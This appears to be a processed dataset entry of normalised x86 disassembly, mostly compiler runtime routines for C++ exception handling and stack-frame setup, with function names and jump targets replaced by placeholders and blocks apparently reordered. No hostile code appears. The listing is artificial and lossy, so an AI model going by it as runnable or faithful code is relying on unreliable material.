mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_405e67
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_409895
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_4049bd
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_40a6a3
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_4097be
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_409701
pop ebx
leave
retn
sub_409934
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_4071bd
call sub_4071bd
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_4099a7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_405e67
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_405e67
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_4099d3
mov edi edi
push ebp
mov ebp esp
call sub_405e67
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_4099fa
mov edi edi
push ebp
mov ebp esp
push esi
call sub_405e67
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_405e67
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_405e67
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_4071bd
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_409a4c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_40978b
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40a790
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_409ab7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_404b3b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_4049cc
pop ecx
sub_409ade
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_406340
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_409b3d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_405e67
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_405e67
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_405e67
and [ eax + 0x90 ] 0x0
jmp sub_407171
sub_409b8c
push 0x10
push r--data
call sub_406c20
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409c4e
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_405e67
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_406c65
retn
call sub_4071bd
call sub_4071bd
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_40a790
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_409c68
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_405e67
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_409cad
push 0x8
push r--data
call sub_406c20
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_406c65
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_4096fa
mov [ ebp - 0x4 ] 0xfffffffe
sub_409d02
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_409d2b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_4071bd
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_409ade
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_409def
push 0x2c
push r--data
call sub_406c20
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_4099a7
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_405e67
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_405e67
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_405e67
mov [ eax + 0x88 ] esi
call sub_405e67
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_409a4c
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_409f15
mov eax [ ebp - 0x1c ]
call sub_406c65
retn
sub_409e88
mov esp [ ebp - 0x18 ]
call sub_405e67
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_409b8c
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_409f15
mov eax [ ebp - 0x1c ]
call sub_406c65
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_409f15
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_4099fa
pop ecx
call sub_405e67
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_405e67
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_4099d3
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_409cad
pop ecx
pop ecx
sub_409f8b
push 0xc
push r--data
call sub_406c20
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_40a812
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_40a812
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4071bd
push ebx
push esi
call sub_40a812
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40a812
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40a812
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_40a812
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_40a812
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_40a812
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_404ba0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_40a812
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_409d02
pop ecx
pop ecx
push eax
push esi
call sub_404ba0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_406c65
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_409d02
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_40a10a
push 0x8
push r--data
call sub_406c20
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_409d02
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_4096fa
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_409f8b
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406c65
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_409d02
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_4096fa
jmp r-xdata
sub_40a19c
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_40a10a
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_4096c8
call sub_409701
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_409b8c
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_409def
add esp 0x28
test eax eax
je r-xdata
sub_40a20a
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_405e67
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_405e67
lea edi [ eax + 0x80 ]
call sub_405cb7
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_409934
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_4071bd
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4097be
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40a19c
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_40a311
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_4071bd
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_405e67
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_4071bd
call sub_407171
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40a20a
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_405e67
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_405e67
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_405e67
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_40a812
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_409934
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_4071bd
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_409cad
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_405e67
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_405e67
mov edi [ eax + 0x94 ]
call sub_405e67
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_409d2b
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_409d2b
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_405095
test al al
jne r-xdata
call sub_4071bd
cmp eax 0x19930522
jne r-xdata
call sub_405e67
call sub_405e67
call sub_405e67
mov [ eax + 0x88 ] esi
call sub_405e67
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_409ade
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_409cad
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_404adf
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_405255
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_40a19c
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_409701
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_409b8c
add esp 0x10
push [ esi + 0x1c ]
call sub_409da6
sub_40a6a3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_405e67
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_40a311
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_409b8c
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40a790
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_4094fc
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_4094fc
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40a7dc
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_401090
mov [ ecx ] r--data
jmp sub_404b3b
sub_4016b0
push esi
mov esi eax
call sub_403c90
mov eax [ esi ]
push eax
call sub_4049cc
add esp 0x4
mov [ esi ] 0x0
pop esi
retn
sub_402fe0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_403480
xor eax eax
pop ebp
retn 0x4
sub_403b90
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push eax
call sub_4049cc
add esp 0x4
sub_403c80
mov ecx [ eax + 0x4 ]
push ecx
call sub_4049cc
pop ecx
